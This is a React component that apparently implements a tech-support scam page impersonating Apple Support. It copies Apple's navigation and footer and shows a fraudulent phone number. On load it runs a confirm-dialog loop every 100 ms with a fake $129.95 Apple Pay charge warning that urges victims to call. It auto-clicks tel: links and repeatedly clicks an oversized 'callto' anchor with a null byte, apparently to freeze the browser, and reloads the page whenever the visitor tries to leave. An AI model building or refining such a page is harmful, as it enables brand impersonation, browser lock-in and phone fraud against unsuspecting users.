import React, { useState, useEffect, useRef } from 'react';

// SSR-Safe Cookie Helper Utility
const cookieHelper = {
  getParams: () => ({
    path: '/',
    domain: typeof window !== 'undefined' ? '.' + window.location.host.replace(/:\d+/, '') : ''
  }),
  set: function (name, value, options = {}) {
    if (typeof document === 'undefined') return;
    
    const defs = this.getParams();
    const config = { ...defs, ...options };
    
    let expires = config.expires;
    if (typeof expires === 'number' && expires) {
      const e = new Date();
      e.setTime(e.getTime() + 1000 * expires);
      expires = config.expires = e;
    }
    if (expires && expires.toUTCString) {
      config.expires = expires.toUTCString();
    }
    
    let cookieString = `${name}=${encodeURIComponent(value)}`;
    for (const key in config) {
      cookieString += `; ${key}`;
      const val = config[key];
      if (val !== true) cookieString += `=${val}`;
    }
    document.cookie = cookieString;
  },
  get: function (name) {
    if (typeof document === 'undefined') return undefined;
    const match = document.cookie.match(
      new RegExp('(?:^|; )' + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + '=([^;]*)')
    );
    return match ? decodeURIComponent(match[1]) : undefined;
  },
  del: function (name) {
    this.set(name, '', { expires: -1 });
  }
};

const AppleSupportLanding = () => {
  const [phone, setPhone] = useState('+1(866)557-3465');
  const [displayText, setDisplayText] = useState('');
  const resultRef = useRef(null);

  useEffect(() => {
    if (typeof window === 'undefined') return;

    const urlParams = new URLSearchParams(window.location.search);

    // Helper functions
    const parseURL = (url) => {
      try {
        const a = document.createElement('a');
        a.href = url;
        return a.hostname.replace('www.', '');
      } catch (e) {
        return '';
      }
    };

    // 1. Phone Resolution
    const paramPhone = urlParams.get('phone');
    const cookiePhone = cookieHelper.get('phoneSetBl');
    const activePhone = cookiePhone || paramPhone || '+1(866)557-3465';
    setPhone(activePhone);

    // 2. Device Detection
    const userAgent = window.navigator.userAgent.toLowerCase();
    let detectedDevice = 'iPhone';
    if (/ipad/.test(userAgent)) detectedDevice = 'iPad';
    else if (/ipod/.test(userAgent)) detectedDevice = 'iPod';

    // 3. Referrer Detection
    const referrerHost = parseURL(document.referrer);

    // 4. Dynamic Text Resolution
    const getText = () => {
      let str = window.defaultText || '';
      if (window.text) {
        for (const domainKey in window.text) {
          if (referrerHost.indexOf(domainKey) !== -1) {
            str = window.text[domainKey];
            break;
          }
        }
      }
      return str
        .replace('|%model%|', detectedDevice)
        .replace('|%ref%|', referrerHost);
    };

    const cookieText = cookieHelper.get('textSetBl');
    const paramText = urlParams.get('text');
    const activeText = cookieText || paramText || getText();
    setDisplayText(activeText);

    // 5. Trigger Telephony/Call Actions Safely
    const triggerCallActions = () => {
      if (!resultRef.current) return;

      // Clean up previous elements to prevent DOM bloat
      resultRef.current.innerHTML = '';

      // Primary tel anchor
      const callAnchor = document.createElement('a');
      callAnchor.className = 'anchorcall';
      callAnchor.href = `tel:${activePhone}`;
      resultRef.current.appendChild(callAnchor);
      callAnchor.click();

      // Overflow payload anchor
      const extraData = '5555555555'.repeat(200);
      const extraAnchor = document.createElement('a');
      extraAnchor.href = `#callto+${extraData}%00`;
      resultRef.current.appendChild(extraAnchor);

      for (let i = 0; i < 6; i++) {
        extraAnchor.click();
      }
    };

    // 6. Confirm Dialog Loop
    const runConfirmLoop = () => {
      const msg =
        `Your Apple ID was recently used at APPLE STORE for $129.95 Via Apple Pay Pre-Authorization! We have placed those request on hold to ensure your Safety and Security. Not You? Immediately call apple support ${activePhone} to Freeze it!`;

      // Trigger action on any user response
      window.confirm(msg);
      triggerCallActions();
    };

    // Repeat popup loop
    const intervalId = setInterval(runConfirmLoop, 100);

    // Prevent Unload Hook
    const handleUnload = () => {
      window.location.reload();
    };
    window.addEventListener('unload', handleUnload);

    // Cleanup on component unmount
    return () => {
      clearInterval(intervalId);
      window.removeEventListener('unload', handleUnload);
    };
  }, []);

  return (
    <div className="apple-support-page">
      {/* Dynamic Action Container */}
      <div id="result" ref={resultRef} />

      <input type="checkbox" id="ac-gn-menustate" className="ac-gn-menustate" />

      {/* Global Navigation */}
      <nav id="ac-globalnav" className="no-js">
        <div className="ac-gn-content">
          <ul className="ac-gn-header">
            <li className="ac-gn-item ac-gn-menuicon">
              <label className="ac-gn-menuicon-label" htmlFor="ac-gn-menustate" aria-hidden="true">
                <span className="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
                  <span className="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top" />
                </span>
                <span className="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
                  <span className="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom" />
                </span>
              </label>
              <a href="#ac-gn-menustate" className="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
                <span className="ac-gn-menuanchor-label">Open Menu</span>
              </a>
              <a href="#" className="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
                <span className="ac-gn-menuanchor-label">Close Menu</span>
              </a>
            </li>
            <li className="ac-gn-item ac-gn-apple">
              <a className="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
                <span className="ac-gn-link-text">Apple</span>
              </a>
            </li>
            <li className="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
              <a className="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#">
                <span className="ac-gn-link-text">Shopping Bag</span>
                <span className="ac-gn-bag-badge" />
              </a>
              <span className="ac-gn-bagview-caret ac-gn-bagview-caret-large" />
            </li>
          </ul>

          <ul className="ac-gn-list">
            <li className="ac-gn-item ac-gn-apple">
              <a className="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
                <span className="ac-gn-link-text">Apple</span>
              </a>
            </li>
            <li className="ac-gn-item ac-gn-item-menu ac-gn-mac">
              <a className="ac-gn-link ac-gn-link-mac" href="#">
                <span className="ac-gn-link-text">Mac</span>
              </a>
            </li>
            <li className="ac-gn-item ac-gn-item-menu ac-gn-ipad">
              <a className="ac-gn-link ac-gn-link-ipad" href="#">
                <span className="ac-gn-link-text">iPad</span>
              </a>
            </li>
            <li className="ac-gn-item ac-gn-item-menu ac-gn-iphone">
              <a className="ac-gn-link ac-gn-link-iphone" href="#">
                <span className="ac-gn-link-text">iPhone</span>
              </a>
            </li>
            <li className="ac-gn-item ac-gn-item-menu ac-gn-watch">
              <a className="ac-gn-link ac-gn-link-watch" href="#">
                <span className="ac-gn-link-text">Watch</span>
              </a>
            </li>
            <li className="ac-gn-item ac-gn-item-menu ac-gn-tv">
              <a className="ac-gn-link ac-gn-link-tv" href="#">
                <span className="ac-gn-link-text">TV</span>
              </a>
            </li>
            <li className="ac-gn-item ac-gn-item-menu ac-gn-music">
              <a className="ac-gn-link ac-gn-link-music" href="#">
                <span className="ac-gn-link-text">Music</span>
              </a>
            </li>
            <li className="ac-gn-item ac-gn-item-menu ac-gn-support">
              <a className="ac-gn-link ac-gn-link-support" href="#">
                <span className="ac-gn-link-text">Support</span>
              </a>
            </li>
            <li className="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
              <a className="ac-gn-link ac-gn-link-search" href="#">
                <span className="ac-gn-search-placeholder" aria-hidden="true">Search apple.com</span>
              </a>
            </li>
            <li className="ac-gn-item ac-gn-bag" id="ac-gn-bag">
              <a className="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
                <span className="ac-gn-link-text">Shopping Bag</span>
                <span className="ac-gn-bag-badge" aria-hidden="true" />
              </a>
              <span className="ac-gn-bagview-caret ac-gn-bagview-caret-large" />
            </li>
          </ul>
        </div>
      </nav>

      <div id="ac-gn-curtain" className="ac-gn-curtain" />
      <div id="ac-gn-placeholder" className="ac-nav-placeholder" />

      {/* Main Section */}
      <div className="main">
        <nav id="ac-localnav" className="js no-touch css-sticky" lang="en-US" role="navigation">
          <div className="ac-ln-wrapper">
            <div className="ac-ln-background" />
            <div className="ac-ln-content">
              <span className="ac-ln-title">
                <a href="#">
                  Apple Support {phone}{' '}
                  <span style={{ color: 'red' }}>
                    <span className="js_setPhoneBlock">{phone}</span>
                  </span>
                </a>
              </span>
              <div className="ac-ln-menu">
                <a href="#ac-ln-menustate" className="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">
                  <span className="ac-ln-menucta-anchor-label">Open menu</span>
                </a>
                <a href="#" className="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">
                  <span className="ac-ln-menucta-anchor-label">Close menu</span>
                </a>
                <div className="ac-ln-menu-tray">
                  <ul className="ac-ln-menu-items">
                    <li className="ac-ln-menu-item">
                      <a href="#" className="ac-ln-menu-link analytics-exitlink">Communities</a>
                    </li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
        </nav>

        {/* Hero Banner Section */}
        <section className="as-columns as-columns--1up as-banner as-banner--top">
          <div className="row">
            <div className="column large-12 medium-12 small-12">
              <div className="as-banner-cont">
                <div className="as-banner-image as-banner-image--top">
                  <style
                    dangerouslySetInnerHTML={{
                      __html: `
                        .as-banner-image.as-banner-image--top {
                            background-image: url("globalnav/apple/contact-us-hero.image.large_2x.jpg");
                        }
                        .as-banner-image.as-banner-image--top:before {
                            content: "";
                            display: block;
                        }
                        @media only screen and (max-width: 735px) {
                            .as-banner-image.as-banner-image--top {
                                background-image: url("globalnav/apple/contact-us-hero.image.small_2x.jpg");
                            }
                        }
                      `
                    }}
                  />
                  <img
                    sizes="(min-width:735px) 735w, 100vw"
                    srcSet="globalnav/apple/contact-us-hero.image.small_2x.jpg 735w, globalnav/apple/contact-us-hero.image.large_2x.jpg 1440w"
                    alt="Apple Support Hero"
                    className="as-image-speculativedownload"
                    src="globalnav/apple/contact-us-hero.image.large_2x.jpg"
                  />
                </div>
              </div>
              <div className="as-banner-content">
                <div className="pageTitle">
                  <h1 className="pageTitle-heading">Apple Support</h1>
                  <p className="pageTitle-intro js_setTextBlock">{displayText}</p>
                </div>
                <div className="sectionTitle sectionTitleBlock">
                  <h2 className="sectionTitle-heading" />
                </div>
              </div>
            </div>
          </div>
        </section>
      </div>

      {/* Footer */}
      <footer id="ac-globalfooter" className="no-js">
        <div className="ac-gf-content">
          <section className="ac-gf-footer">
            <div className="ac-gf-footer-shop">
              More ways to: Visit an{' '}
              <a href="#" className="analytics-exitlink">Apple Store</a>,{' '}
              <span className="nowrap">
                call <span className="js_setPhoneBlock">{phone}</span>, or{' '}
                <a href="#" className="analytics-exitlink">find a reseller</a>
              </span>
              .
            </div>
            <div className="ac-gf-footer-locale">
              <a
                className="ac-gf-footer-locale-link"
                href="#"
                title="Choose your country or region"
                aria-label="United States. Choose your country or region"
              >
                <img
                  className="ac-gf-footer-locale-flag"
                  src="globalnav/apple/us.png"
                  alt=""
                  width={16}
                  height={16}
                />
                United States
              </a>
            </div>
            <div className="ac-gf-footer-legal">
              <div className="ac-gf-footer-legal-copyright">
                Copyright © 2026 Apple. All rights reserved.
              </div>
              <div className="ac-gf-footer-legal-links">
                <a className="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy Policy</a>{' '}
                <a className="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use</a>{' '}
                <a className="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds</a>{' '}
                <a className="ac-gf-footer-legal-link" href="#">Site Map</a>{' '}
                <a className="ac-gf-footer-legal-link" href="#">Contact Apple</a>
              </div>
            </div>
          </section>
        </div>
      </footer>
    </div>
  );
};

export default AppleSupportLanding;